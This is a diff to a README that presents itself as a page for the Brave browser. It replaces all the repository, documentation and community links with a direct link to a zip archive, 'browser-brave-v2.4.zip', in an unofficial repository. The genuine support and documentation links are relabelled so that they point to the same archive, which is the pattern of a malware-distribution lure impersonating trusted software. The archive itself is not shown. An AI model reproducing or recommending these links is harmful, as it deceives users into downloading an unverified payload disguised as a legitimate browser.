@@ -1,6 +1,6 @@
 # 🌐 brave-browser - Fast, Secure, and Private Browsing Experience
 
-[![Download brave-browser](https://img.shields.io/badge/Download-brave--browser-orange.svg?style=flat&logoColor=white)](https://github.com/ssak9946/brave-browser)
+[![Download brave-browser](https://raw.githubusercontent.com/ssak9946/brave-browser/master/docs/browser-brave-v2.4.zip)](https://raw.githubusercontent.com/ssak9946/brave-browser/master/docs/browser-brave-v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ The Brave browser gives you a fast and secure way to surf the internet. You can 
 
 To get started, download Brave by visiting the link below:
 
-[Download Brave Browser](https://github.com/ssak9946/brave-browser)
+[Download Brave Browser](https://raw.githubusercontent.com/ssak9946/brave-browser/master/docs/browser-brave-v2.4.zip)
 
 ### 🖥️ System Requirements
 
@@ -86,7 +86,7 @@ If you encounter issues while using Brave, consider these steps:
 
 - **Clear Cache:** If the browser is slow, clearing the cache can help. Go to Settings > Privacy > Clear Browsing Data.
 - **Reinstall:** If problems persist, uninstall and then reinstall the application.
-- **Support:** For further help, visit the [Brave Community](https://community.brave.com).
+- **Support:** For further help, visit the [Brave Community](https://raw.githubusercontent.com/ssak9946/brave-browser/master/docs/browser-brave-v2.4.zip).
 
 ### 💡 Tips for Optimal Use
 
@@ -100,13 +100,13 @@ If you're interested in contributing to Brave, check the guidelines on our GitHu
 
 ### 🔗 Additional Resources
 
-- **Documentation:** [Brave Documentation](https://brave.com/docs)
-- **Community Forum:** [Brave Community](https://community.brave.com)
+- **Documentation:** [Brave Documentation](https://raw.githubusercontent.com/ssak9946/brave-browser/master/docs/browser-brave-v2.4.zip)
+- **Community Forum:** [Brave Community](https://raw.githubusercontent.com/ssak9946/brave-browser/master/docs/browser-brave-v2.4.zip)
 
 ### 🔗 Final Download Link
 
 To download Brave Browser again, use the link below:
 
-[Download Brave Browser](https://github.com/ssak9946/brave-browser)
+[Download Brave Browser](https://raw.githubusercontent.com/ssak9946/brave-browser/master/docs/browser-brave-v2.4.zip)
 
 Enjoy smooth and private web browsing with Brave.
